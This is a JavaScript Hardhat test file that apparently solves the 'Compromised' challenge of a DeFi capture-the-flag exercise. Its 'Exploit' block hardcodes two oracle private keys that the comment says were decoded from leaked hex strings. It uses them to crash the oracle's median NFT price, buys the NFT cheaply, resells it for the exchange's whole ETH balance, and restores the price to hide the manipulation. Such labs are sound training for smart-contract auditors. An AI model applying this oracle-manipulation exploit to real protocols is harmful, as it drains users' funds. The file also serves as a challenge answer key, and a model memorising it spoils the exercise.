const { expect } = require('chai');
const { ethers } = require('hardhat');
const { ether, balance } = require("@openzeppelin/test-helpers");
const { accounts, contract, web3 } = require("@openzeppelin/test-environment");
describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    /**
     * Process: Decode hex strings outside of program to get oracles private keys
     * Since we own 2/3 of the oracles we can set the median price to an extremely low value for attacker purchase
     * Reset median price to balance of exchange contract
     * Sell NFT back for the new median price 
     * Reset oracle price back to initial 
     */
    it('Exploit', async function () {        
        const account1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const account2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

        const oracle1 = new ethers.Wallet(account1, ethers.provider);
        const oracle2 = new ethers.Wallet(account2, ethers.provider);

        const orc1T = this.oracle.connect(oracle1);
        const orc2T = this.oracle.connect(oracle2);


        const setMedPrice = async (amount) => {
            // Before
            let currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
            await orc1T.postPrice("DVNFT", amount)
            
            // After 1 oracle
            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
            await orc2T.postPrice("DVNFT", amount)

            // After 2 oracle
            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
            
        }

        // Set price to 0.001.
        let price = ethers.utils.parseEther("0.001");
        await setMedPrice(price);

        const attackExchange = this.exchange.connect(attacker);
        const attackNFT = this.nftToken.connect(attacker);

        // Purchase the NFT
        await attackExchange.buyOne({
            value: price
        })

        // Expect that we own the nft
        const tokenId = 0;
        const ownerId = await attackNFT.ownerOf(tokenId);
        expect(ownerId).to.equal(attacker.address);

      
        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address);

        //Set nft price to 'exchangeBalance'
        price = exchangeBalance
        await setMedPrice(price);


       
        await attackNFT.approve(attackExchange.address, tokenId);
        await attackExchange.sellOne(tokenId);

        // Finally reset oracle price
        price = INITIAL_NFT_PRICE;
        await setMedPrice(price);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
